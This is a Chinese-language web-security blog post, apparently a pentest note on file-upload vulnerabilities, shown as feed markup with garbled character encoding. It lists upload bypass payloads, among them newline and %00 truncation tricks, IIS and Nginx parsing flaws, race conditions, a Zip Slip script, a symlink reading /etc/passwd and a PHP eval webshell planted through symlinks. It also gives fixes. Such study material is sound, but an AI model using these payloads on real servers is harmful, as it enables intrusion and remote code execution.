class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>æ­£åˆ™è¡¨è¾¾å¼ä¸­$ä¸ä»…åŒ¹é…å­—ç¬¦ä¸²ç»“å°¾ä½ç½®ï¼Œä¹Ÿå¯ä»¥åŒ¹é…\n æˆ– \rï¼Œä»è€Œå¯¼è‡´å¯ä»¥ä¸Šä¼ <code>.php\n</code>ç»•è¿‡<strong>é»‘åå•</strong>æ ¡éªŒï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥è¢«ä½œä¸ºPHPæ–‡ä»¶è§£æã€‚ï¼ˆä¸èƒ½æ˜¯<code>.php\r\n</code>ï¼‰</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¸Šä¼ ï¼š1.php\x0a</span><br><span class="line">è®¿é—®ï¼š1.php%0a</span><br></pre></td></tr></table></figure></li></ul><p>ä¸Šè¿°æ¼æ´ä¿®å¤ï¼šå› ä¸ºApacheçš„è§£ææ¼æ´æ˜¯ç”±äºç•¸å½¢æ‰©å±•åå’Œç•¸å½¢æ–‡ä»¶åå¯¼è‡´çš„ï¼Œæ‰€ä»¥ä½¿ç”¨ç™½åå•ï¼Œå¹¶å¯¹æ–‡ä»¶é‡å‘½åï¼Œæ–‡ä»¶å°±ä¸ä¼šå­˜åœ¨ç•¸å½¢å­—ç¬¦å’Œå¤šæ‰©å±•åçš„æƒ…å†µã€‚</p><p>å‚è€ƒå¦‚ä¸‹ä»£ç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># $_FILES[&#x27;file&#x27;][&#x27;name&#x27;]ä¼šè‡ªåŠ¨æŠŠæ¢è¡Œå»æ‰</span></span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line"><span class="comment">//...å…¶ä»–æ£€æŸ¥</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, [<span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>], <span class="literal">true</span>)) &#123;</span><br><span class="line">        <span class="variable">$new_name</span> = <span class="string">&#x27;./upload/&#x27;</span> . <span class="title function_ invoke__">uniqid</span>() . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$ext</span>;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$new_name</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="å›¾ç‰‡ç™½åå•ç»•è¿‡"><a href="#å›¾ç‰‡ç™½åå•ç»•è¿‡" class="headerlink" title="å›¾ç‰‡ç™½åå•ç»•è¿‡"></a>å›¾ç‰‡ç™½åå•ç»•è¿‡</h1><h3 id="00æˆªæ–­"><a href="#00æˆªæ–­" class="headerlink" title="%00æˆªæ–­"></a>%00æˆªæ–­</h3><h4 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h4><ul><li>phpç‰ˆæœ¬&lt;5.3.4</li><li>magic_quotes_gpcå…³é—­</li><li>ä¿å­˜çš„æ–‡ä»¶åå¯æ§</li></ul><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; </span><br></pre></td></tr></table></figure><p>åç«¯ä½¿ç”¨<code>move_uploaded_file</code>æ¥ç§»åŠ¨æ–‡ä»¶ï¼Œ<code>move_uploaded_file</code>å‡½æ•°åº•å±‚ä¸ºcè¯­è¨€ï¼Œé‡åˆ°0x00ä¼šæˆªæ–­ï¼ˆå­—ç¬¦ä¸²ç»“æŸæ ‡å¿—ï¼‰</p><p>Demo</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?save_path=../upload/shell.php%<span class="number">00</span></span><br><span class="line"></span><br><span class="line">filename=shell.jpg</span><br></pre></td></tr></table></figure><h3 id="è§£ææ¼æ´"><a href="#è§£ææ¼æ´" class="headerlink" title="è§£ææ¼æ´"></a>è§£ææ¼æ´</h3><h4 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h4><ul><li><p>5.x  , 6.0</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ–‡ä»¶å¤¹è§£ææ¼æ´</span><br><span class="line">ä¼šå°† *.asp/ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å½“æˆAspè§£æ</span><br></pre></td></tr></table></figure></li><li><p>6.0</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># åˆ†å·æˆªæ–­æ¼æ´</span><br><span class="line">é»˜è®¤ä¼šå°† *.asp;.jpg æ­¤ç§æ ¼å¼çš„æ–‡ä»¶åï¼Œå½“æˆAspè§£æï¼ŒåŸç†æ˜¯æœåŠ¡å™¨é»˜è®¤ä¸è§£æ; å·åŠå…¶åé¢çš„å†…å®¹ï¼Œç›¸å½“äºæˆªæ–­ã€‚</span><br></pre></td></tr></table></figure></li></ul><p>ä¿®å¤æ–¹æ¡ˆï¼šIISæœåŠ¡å™¨æœ¬èº«ç¼ºé™·ï¼Œå‡çº§ç‰ˆæœ¬&#x2F;æ‰“è¡¥ä¸</p><h4 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h4><ul><li><p>æ–‡ä»¶ç±»å‹é”™è¯¯è§£ææ¼æ´ï¼ˆIIS7.xç‰ˆæœ¬åœ¨Fast-CGIè¿è¡Œæ¨¡å¼ä¸‹ä¹Ÿå­˜åœ¨ï¼‰</p><p>äº§ç”ŸåŸå› ï¼š</p><p><code>FastCGI</code>ä¸<code>PHP</code>å¯¹PATH_INFOå¤„ç†çš„å·®å¼‚ã€‚ </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payload</span></span><br><span class="line">/example.gif/.php</span><br></pre></td></tr></table></figure><p>ä¿®å¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åœ¨php.iniä¸­è®¾ç½®fix_pathinfo=0 æˆ–è€…è®¾ç½®security.limit_extensions = .php</span><br><span class="line">æˆ–è€…</span><br><span class="line">åœ¨nginxçš„é…ç½®æ–‡ä»¶ä¸­è®¾ç½®fastcgi_spilt_path_info  ^(.+\.php)(.*)$;</span><br></pre></td></tr></table></figure></li><li><p>ç©ºå­—èŠ‚è§£ææ¼æ´ï¼ˆCVE-2013-4547ï¼‰</p><p>å—å½±å“ç‰ˆæœ¬ï¼š0.841<del>1.4.3&#x2F;1.5.0</del>1.5.7</p><p>äº§ç”ŸåŸå› ï¼š</p><p>nginxé…ç½®ä¸å½“</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line">å½“ç”¨æˆ·è¯·æ±‚info.jpg%00.phpæ—¶ï¼Œå› ä¸ºinfo.jpg%00.phpèƒ½å¤ŸåŒ¹é…æ­£åˆ™&quot;.php$&quot;ï¼Œæ‰€ä»¥å¯ä»¥è¿›å…¥è¯¥<span class="section">location</span>å—ã€‚</span><br><span class="line">ä½†æ˜¯nginxåœ¨è§£ææ–‡ä»¶åæ—¶è¢«%<span class="number">00</span>æˆªæ–­ï¼Œå¯¼è‡´ä»¥ä¸ºè¯·æ±‚çš„æ–‡ä»¶æ˜¯info.jpgå¹¶å‘ç»™fastcgiï¼Œæ‰€ä»¥fastcgiå°±å°†info.jpgå½“ä½œphpæ–‡ä»¶è¿›è¡Œè§£æäº†ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payload</span></span><br><span class="line">ä¸Šä¼ æ–‡ä»¶ï¼šinfo.jpg</span><br><span class="line">è¯·æ±‚æ–‡ä»¶ï¼šinfo.jpg%<span class="number">00</span>.php</span><br></pre></td></tr></table></figure><p>ä¿®å¤ï¼šå‡çº§ç‰ˆæœ¬</p></li></ul><h3 id="é…åˆæ–‡ä»¶åŒ…å«"><a href="#é…åˆæ–‡ä»¶åŒ…å«" class="headerlink" title="é…åˆæ–‡ä»¶åŒ…å«"></a>é…åˆæ–‡ä»¶åŒ…å«</h3><ul><li><p>å›¾ç‰‡ğŸ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  ç»•è¿‡å®½é«˜æ£€æŸ¥</span></span><br><span class="line"><span class="comment">#define width 1</span></span><br><span class="line"><span class="comment">#define height 1</span></span><br></pre></td></tr></table></figure><p><a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator">https://github.com/huntergregal/PNG-IDAT-Payload-Generator</a></p><p>ç”¨æ•°æ®é‡å°çš„å›¾ç‰‡ï¼Œæ¯”å¦‚éšä¾¿æˆªä¸€å¼ å¾ˆå°çš„å›¾</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ™®é€šï¼šcopy,ç›´æ¥æ’å…¥</span><br><span class="line">äºŒæ¬¡æ¸²æŸ“ï¼šæ‰¾åˆ°å‰åå›¾ç‰‡ä¸­æ²¡æœ‰å‘ç”Ÿå˜åŒ–çš„hexæ•°æ®ï¼Œæ›¿æ¢ä¸ºæœ¨é©¬</span><br></pre></td></tr></table></figure></li><li><p>æ–‡ä»¶åŒ…å«trick</p></li></ul><h3 id="é…åˆæ–‡ä»¶è¯»å–ååºåˆ—åŒ–"><a href="#é…åˆæ–‡ä»¶è¯»å–ååºåˆ—åŒ–" class="headerlink" title="é…åˆæ–‡ä»¶è¯»å–ååºåˆ—åŒ–"></a>é…åˆæ–‡ä»¶è¯»å–ååºåˆ—åŒ–</h3><p>ä¸Šä¼ ä»»æ„åç¼€çš„pharæ ¼å¼çš„æ–‡ä»¶ï¼Œé…åˆæ–‡ä»¶è¯»å–ç”¨<code>phar://</code>è§£æ</p><h1 id="æ¡ä»¶ç«äº‰"><a href="#æ¡ä»¶ç«äº‰" class="headerlink" title="æ¡ä»¶ç«äº‰"></a>æ¡ä»¶ç«äº‰</h1><p>Demo</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">    <span class="comment"># move_uploaded_fileæˆåŠŸåæ‰åˆ¤æ–­æ˜¯å¦åˆæ³•</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æœåŠ¡ç«¯å…ˆå°†ä¸Šä¼ çš„æ–‡ä»¶å†™å…¥ï¼Œå†åˆ¤æ–­æ˜¯å¦åˆæ³•ï¼Œé€šè¿‡æ¡ä»¶ç«äº‰åœ¨æ–‡ä»¶åˆ é™¤å‰è®¿é—®webshellå†™å…¥æ–°çš„webshellå³å¯ã€‚</p><h1 id="å‹ç¼©æ–‡ä»¶è§£å‹é—®é¢˜"><a href="#å‹ç¼©æ–‡ä»¶è§£å‹é—®é¢˜" class="headerlink" title="å‹ç¼©æ–‡ä»¶è§£å‹é—®é¢˜"></a>å‹ç¼©æ–‡ä»¶è§£å‹é—®é¢˜</h1><p>æœåŠ¡ç«¯ä¼šå¯¹ä¸Šä¼ çš„å‹ç¼©åŒ…è¿›è¡Œè§£å‹ï¼Œå¯ä»¥æ„é€ æ¶æ„å‹ç¼©åŒ…æ”»å‡»</p><h2 id="ä»»æ„æ–‡ä»¶è¯»å–"><a href="#ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="ä»»æ„æ–‡ä»¶è¯»å–"></a>ä»»æ„æ–‡ä»¶è¯»å–</h2><p>Linuxè½¯é“¾æ¥</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s /etc/passwd test</span><br><span class="line">zip -y passwd.zip test  # -y ä¿è¯è§£å‹å‡ºæ¥çš„è¿˜æ˜¯è½¯é“¾æ¥</span><br></pre></td></tr></table></figure><h2 id="ç›®å½•ç©¿è¶Š"><a href="#ç›®å½•ç©¿è¶Š" class="headerlink" title="ç›®å½•ç©¿è¶Š"></a>ç›®å½•ç©¿è¶Š</h2><ul><li><p>é€šè¿‡æ„é€ å‹ç¼©æ–‡ä»¶çš„æ–‡ä»¶åï¼Œé€ æˆç›®å½•ç©¿è¶Š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="comment"># the name of the zip file to generate</span></span><br><span class="line">zf = zipfile.ZipFile(<span class="string">&#x27;out.zip&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="comment"># the name of the malicious file that will overwrite the origial file (must exist on disk)</span></span><br><span class="line">fname = <span class="string">&#x27;sec_test.txt&#x27;</span></span><br><span class="line"><span class="comment">#destination path of the file</span></span><br><span class="line">zf.write(fname, <span class="string">&#x27;../../../../../../../../../../../../../../../../../../../../../../../../tmp/sec_test.tmp&#x27;</span>)</span><br></pre></td></tr></table></figure><p>æ‰€æœ‰å·²å‘ç°å—<code>Zip Slip</code>å½±å“çš„é¡¹ç›®:<a href="https://github.com/snyk/zip-slip-vulnerability">https://github.com/snyk/zip-slip-vulnerability</a></p><p><strong>æ³¨</strong>ï¼šå¦‚æœç”¨çš„æ˜¯å‘½ä»¤<code>unzip</code>æ¥è§£å‹ï¼Œè¿™ç§æ–¹æ³•å°±æ²¡ç”¨äº†ï¼Œå› ä¸º<code>unzip</code> é»˜è®¤è·³è¿‡æ–‡ä»¶åä¸­çš„<code>../</code></p></li><li><p>è½¯é“¾æ¥çš„å¦™ç”¨</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">åˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥æŒ‡å‘ç½‘ç«™ç›®å½•</span></span><br><span class="line">ln -s /var/www/html test</span><br><span class="line">zip -y 1.zip test</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">åˆ›å»ºä¸€ä¸ªä¸è½¯é“¾æ¥åŒåçš„ç›®å½•ï¼Œå¹¶åœ¨è¯¥ç›®å½•ä¸‹åˆ›å»ºæœ¨é©¬æ–‡ä»¶</span></span><br><span class="line">mkdir a &amp;&amp; cd a </span><br><span class="line">mkdir test</span><br><span class="line">echo &#x27;&lt;?php @eval($_GET[1]); ?&gt;&#x27; &gt; test/shell.php</span><br><span class="line">chmod 777 test/shell.php</span><br><span class="line">zip -r 2.zip test</span><br></pre></td></tr></table></figure><p>ç„¶åå…ˆä¸Šä¼ 1.zipï¼Œè§£å‹å¾—åˆ°è½¯é“¾æ¥<code>test</code>ï¼Œå†ä¸Šä¼ 2.zipï¼Œè§£å‹å¾—åˆ°testç›®å½•å’Œshell.phpï¼Œå› ä¸ºtestæŒ‡å‘&#x2F;var&#x2F;www&#x2F;html,æ‰€ä»¥shell.phpå®é™…ä¸Šæ˜¯è¢«è§£å‹åˆ°ç½‘ç«™ç›®å½•ä¸‹</p></li></ul><h2 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h2><p>Fromï¼šä»£ç å®¡è®¡çŸ¥è¯†æ˜Ÿçƒ</p><p>ä¿®æ”¹å‹ç¼©åŒ…äºŒè¿›åˆ¶å­—èŠ‚ï¼Œè®©å‹ç¼©åŒ…è§£å‹è¿‡ç¨‹å‡ºé”™ï¼Œä½†æ˜¯å‡ºé”™å‰å·²è§£å‹éƒ¨åˆ†å³ä¸ºwebshellã€‚ï¼ˆå‡ºé”™åæ•è·å¼‚å¸¸ï¼Œç¨‹åºä¸­æ­¢ï¼Œå¦‚æœå¼€å‘äººå‘˜æ²¡æœ‰å¯¹å·²è§£å‹éƒ¨åˆ†è¿›è¡Œæ ¡éªŒï¼Œé‚£ä¹ˆå·²è§£å‹å‡ºçš„webshellå°±å¯ä»¥ç•™åœ¨æœåŠ¡ç«¯ä¸­ï¼‰</p><p><a href="https://www.leavesongs.com/PENETRATION/after-phpcms-upload-vul.html">https://www.leavesongs.com/PENETRATION/after-phpcms-upload-vul.html</a></p><h1 id="ä¸Šä¼ æ¥å£å¯»æ‰¾"><a href="#ä¸Šä¼ æ¥å£å¯»æ‰¾" class="headerlink" title="ä¸Šä¼ æ¥å£å¯»æ‰¾"></a>ä¸Šä¼ æ¥å£å¯»æ‰¾</h1><ul><li><p>é€šè¿‡è§‚å¯Ÿå‘½åæ¥fuzzæ¥å£</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">uploadImg.cspx</span><br><span class="line">uploadfile.cspx</span><br><span class="line">uploadtest.cspx</span><br><span class="line"></span><br><span class="line">upload_test.cspx</span><br><span class="line">upload_2018.php</span><br><span class="line"></span><br><span class="line">upload2019.php</span><br><span class="line">upload2020.jsp</span><br></pre></td></tr></table></figure></li><li><p>ä¸Šä¼ æ¥å£æµ‹è¯•</p></li></ul><p>From <a href="https://y4er.com/posts/pentest-idea-sharing-file/#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">https://y4er.com/posts/pentest-idea-sharing-file/#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0</a></p><p><img src="/../images/image-20230605161933817.png" alt="image-20230605161933817"></p><h1 id="ä¸Šä¼ åé—®é¢˜"><a href="#ä¸Šä¼ åé—®é¢˜" class="headerlink" title="ä¸Šä¼ åé—®é¢˜"></a>ä¸Šä¼ åé—®é¢˜</h1><h3 id="è„šæœ¬æ–‡ä»¶è®¿é—®403"><a href="#è„šæœ¬æ–‡ä»¶è®¿é—®403" class="headerlink" title="è„šæœ¬æ–‡ä»¶è®¿é—®403"></a>è„šæœ¬æ–‡ä»¶è®¿é—®403</h3><p>å°è¯•å…¶ä»–åç¼€</p><h3 id="æ²¡æœ‰æ‰§è¡Œæƒé™"><a href="#æ²¡æœ‰æ‰§è¡Œæƒé™" class="headerlink" title="æ²¡æœ‰æ‰§è¡Œæƒé™"></a>æ²¡æœ‰æ‰§è¡Œæƒé™</h3><p>è¡¨ç°ï¼šè®¿é—®æ—¶æ–‡ä»¶ç›´æ¥ä¸‹è½½</p><p>å°è¯•ç›®å½•ç©¿è¶Šï¼Œè·³åˆ°å¯ä»¥æ‰§è¡Œè„šæœ¬è¯­è¨€çš„ç›®å½•</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">///../../../</span><br></pre></td></tr></table></figure><blockquote><p>ä»¥&#x2F;&#x2F;&#x2F;å¼€å¤´æ˜¯å› ä¸ºå¯èƒ½ä¼šè½¬ç ï¼Œå¯¼è‡´å†™å…¥å¤±è´¥</p></blockquote><h3 id="æ–‡ä»¶è·¯å¾„å¯»æ‰¾"><a href="#æ–‡ä»¶è·¯å¾„å¯»æ‰¾" class="headerlink" title="æ–‡ä»¶è·¯å¾„å¯»æ‰¾"></a>æ–‡ä»¶è·¯å¾„å¯»æ‰¾</h3><p>From <a href="https://www.cnblogs.com/yokan/p/15252077.html">https://www.cnblogs.com/yokan/p/15252077.html</a></p><ul><li><p>å› ä¸ºä¼ ä¸Šå»çš„æ–‡ä»¶ï¼Œå¦‚å›¾ç‰‡è¿™ç±»çš„æ€»å½’æ˜¯æ˜¾ç¤ºå‡ºæ¥çš„ï¼Œæ‰€ä»¥å¯ä»¥å…ˆåœ¨webåº”ç”¨åˆ°å¤„ç‚¹ç‚¹ï¼Œå¤šåŠ è½½ä¸€äº›æ•°æ®åŒ…ï¼Œç„¶åå†åˆ°burpçš„http historyæœç´¢shellçš„åå­—</p></li><li><p><strong>è¿”å›äº†ä¸€äº›å‚æ•°ä½†ä¸åŒ…æ‹¬è·¯å¾„çš„æƒ…å†µ</strong>ï¼Œæ¯”å¦‚file_id ç­‰ç­‰ï¼Œé‚£ä¹ˆæ–‡ä»¶è·¯å¾„å¯èƒ½å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå¯ä»¥<strong>ç»“åˆsqlæ³¨å…¥</strong> sqlmapçš„â€“search -Cå‚æ•°æ‰¾åˆ°å­—æ®µå’Œå€¼</p></li><li><p><strong>ä»€ä¹ˆéƒ½æ²¡è¿”å›çš„æƒ…å†µï¼Œåªè¿”å›äº†okï¼Œtrueç­‰ç­‰ã€‚é‡æ–°åŠ è½½ï¼ŒæŠ“åŒ…çœ‹å“åº”ï¼Œæˆ–è®¸æŸä¸ªæ¥å£çš„å“åº”å°±åŒ…æ‹¬å¯¹åº”çš„è·¯å¾„ã€‚</strong></p><p>æ¯”å¦‚å¤´åƒä½ç½®ä¸Šä¼ ä¸Šå»äº†ï¼Œä½†æ˜¯æ²¡æœ‰è¿”å›è·¯å¾„ï¼Œé‚£ä¹ˆæƒ³åŠæ³•è®©ä»–åœ¨åŠ è½½ä¸€éï¼Œæ¯”å¦‚é€€å‡ºé‡æ–°ç™»é™†ï¼Œä¸€ä¸ªåŒ…ä¸€ä¸ªåŒ…çš„æ”¾ã€‚å¯èƒ½æœ‰äº›åŒ…çš„å“åº”ä¸­å°±åŒ…å«è·¯å¾„ã€‚</p><p>   å¦å¤–å¯èƒ½å­˜åœ¨å…¶ä»–æœåŠ¡å™¨ã€æˆ–è€…å…¶ä»–ç«™ç‚¹çš„å…¶ä»–è·¯å¾„ï¼Œä¹Ÿæ˜¯æŠ“åŒ…æŸ¥çœ‹ï¼Œçœ‹ä¸€ä¸‹åŠ è½½è¿‡ç¨‹çš„è·¯å¾„åœ¨å“ªæˆ–è€…çœ‹ä¸€ä¸‹htmlã€js</p><p>[<img src="/../images/1964477-20210910165949941-1026982801.png" alt="img"></p></li><li><p><strong>å°è¯•è®¿é—®æ—¥å¿—æ–‡ä»¶ï¼Œçœ‹èƒ½å¦å‘ç°ä¸€äº›æ•æ„Ÿç›®å½•æˆ–ä¸Šä¼ ç›®å½•</strong></p></li><li><p><strong>åªè¿”å›äº†æ–‡ä»¶åï¼Œæ²¡æœ‰è·¯å¾„</strong></p><p>ä¸€ç§æ˜¯fuzzï¼Œçœ‹å…¶ä»–åŒç±»å‹æ–‡ä»¶çš„è·¯å¾„ï¼Œf12æˆ–è€…å¦‚æœæœ‰æ–‡ä»¶ä¸‹è½½çš„åœ°æ–¹ï¼Œä¸‹è½½æŠ“åŒ…ï¼Œçœ‹æ–‡ä»¶åœ°å€ã€‚</p><p>å¦ä¸€ç§æ˜¯ å°è¯•ä¸Šä¼ çš„æ—¶å€™<strong>ç›®å½•ç©¿è¶Š</strong>ï¼Œä¸€æ¬¡ä¸€æ¬¡å°è¯•ï¼Œçœ‹èƒ½å¦<strong>ç©¿åˆ°ç«™ç‚¹æ ¹ç›®å½•</strong>æˆ–è€…<strong>çŸ¥é“çš„ç›®å½•ä¸‹é¢</strong>ã€‚ä¿®æ”¹è¡¨å•çš„å…¶ä»–å‚æ•°ã€æˆ–è€…filenameå‚æ•°çš„å€¼</p></li></ul><h1 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h1><ul><li><p>ç™½åå•æœºåˆ¶</p></li><li><p>ä¸Šä¼ æ–‡ä»¶é‡å‘½å</p></li><li><p>éšè—ä¸Šä¼ æ–‡ä»¶è·¯å¾„</p></li><li><p>æ–‡ä»¶å†…å®¹æ ¡éªŒå’Œè¿‡æ»¤</p></li><li><p>é¿å…æ¡ä»¶ç«äº‰ï¼Œå…ˆåˆ¤æ–­æ˜¯å¦åˆæ³•ï¼Œè€Œä¸æ˜¯å…ˆå°†æ–‡ä»¶å†™å…¥å†åˆ¤æ–­æ˜¯å¦åˆæ³•</p></li><li><p>ä¸Šä¼ çš„æ–‡ä»¶ç»Ÿä¸€æ”¾åˆ°ä¸€ä¸ªåœ°æ–¹ï¼Œéµå¾ªä»¥ä¸‹åŸåˆ™</p><p><code>ç›®å½•å¯å†™ä½†ä¸å¯è§£æï¼Œå¯è§£æä½†ä¸å¯å†™å…¥</code></p><p>æˆ–è€…ä¸Šä¼ åˆ°ä¸“é—¨ç”¨æ¥ä¿å­˜æ–‡ä»¶çš„åœ°æ–¹ï¼Œå¦‚å­˜å‚¨OSS</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHPä»£ç å®¡è®¡</title>
      <link href="/2023/05/31/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2023/05/31/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<ul><li><p><input checked="" disabled="" type="checkbox"> BlueCMS</p></li><li><p><input checked="" disabled="" type="checkbox"> SeaCMS</p></li><li><p><input checked="" disabled="" type="checkbox"> DedeCMS</p></li><li><p><input checked="" disabled="" type="checkbox"> ThinkPHP</p></li></ul><h1 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h1><p><a href="https://blog.csdn.net/Xxy605/article/details/120973447">https://blog.csdn.net/Xxy605/article/details/120973447</a></p><h1 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h1><p>From <a href="https://www.anquanke.com/post/id/265092#h3-5">https://www.anquanke.com/post/id/265092#h3-5</a></p><ul><li>å‡½æ•°é›†æ–‡ä»¶ï¼Œé€šå¸¸å‘½ååŒ…å«functionæˆ–è€…commonç­‰å…³é”®å­—ï¼Œè¿™äº›æ–‡ä»¶é‡Œé¢æ˜¯ä¸€äº›å…¬å…±çš„å‡½æ•°ï¼Œæä¾›å…¶ä»–æ–‡ä»¶ç»Ÿä¸€è°ƒç”¨ï¼Œæ‰€ä»¥å¤§å¤šæ•°æ–‡ä»¶éƒ½ä¼šåœ¨æ–‡ä»¶å¤´éƒ¨åŒ…å«åˆ°å…¶ä»–æ–‡ä»¶ã€‚å¯»æ‰¾è¿™äº›æ–‡ä»¶ä¸€ä¸ªéå¸¸å¥½ç”¨çš„æŠ€å·§å°±æ˜¯å»æ‰“å¼€index.phpæˆ–è€…ä¸€äº›åŠŸèƒ½æ€§æ–‡ä»¶ï¼Œåœ¨å¤´éƒ¨ä¸€èˆ¬éƒ½èƒ½æ‰¾åˆ°ã€‚</li><li>é…ç½®æ–‡ä»¶ï¼Œé€šå¸¸å‘½åä¸­åŒ…æ‹¬configå…³é”®å­—ï¼Œé…ç½®æ–‡ä»¶åŒ…æ‹¬webç¨‹åºè¿è¡Œå¿…é¡»çš„åŠŸèƒ½æ€§é…ç½®é€‰é¡¹ä»¥åŠæ•°æ®åº“ç­‰é…ç½®ä¿¡æ¯ã€‚ä»è¿™ä¸ªæ–‡ä»¶ä¸­å¯ä»¥äº†è§£ç¨‹åºçš„å°éƒ¨åˆ†åŠŸèƒ½ï¼Œå¦å¤–çœ‹è¿™ä¸ªæ–‡ä»¶çš„æ—¶å€™æ³¨æ„è§‚å¯Ÿé…ç½®æ–‡ä»¶ä¸­å‚æ•°å€¼æ˜¯å•å¼•å·è¿˜æ˜¯ç”¨åŒå¼